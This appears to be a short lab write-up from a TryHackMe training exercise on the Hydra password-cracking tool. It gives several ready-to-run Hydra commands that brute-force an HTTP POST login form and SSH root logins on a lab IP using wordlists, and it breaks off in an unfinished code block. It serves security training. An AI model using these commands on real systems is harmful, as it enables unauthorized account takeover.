## Basic Hydra Syntax

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.10 http-post-form "/login.php:username=^USER^&password=^PASS^:F=Invalid"

# Targeting an HTTP POST Login Form
hydra -l admin \
      -P /usr/share/wordlists/rockyou.txt \
      10.10.10.10 \
      http-post-form "/login.php:username=^USER^&password=^PASS^:F=Invalid login"

# Using a Username List Instead of a Single User
hydra -L users.txt \
      -P passwords.txt \
      10.10.10.10 \
      http-post-form "/login.php:username=^USER^&password=^PASS^:F=Invalid login"

# Brute-Forcing SSH (Lab Machine Only)
hydra -l root -P passwords.txt ssh://10.10.10.10

# Increasing Task Threads for Faster Attempts
hydra -l admin -P passwords.txt -t 16 10.10.10.10 ssh
```

# Hydra Brute-Force Lab (TryHackMe)

## Overview
This lab demonstrates the use of **Hydra**, a fast network logon cracker, to perform controlled brute-force and dictionary-based attacks against web applications and network services.

All activities were conducted in a legal, isolated lab environment as part of a cybersecurity training exercise.

---

## Objectives
- Understand how brute-force and dictionary attacks work
- Configure Hydra for HTTP POST login forms
- Test SSH authentication with password lists
- Analyze authentication failure responses
- Identify defensive mitigation strategies

---

## Tool Used
- Hydra (THC-Hydra)

---

## Basic Syntax

```bash
hydra -l <username> -P <password_list> <target> <service>

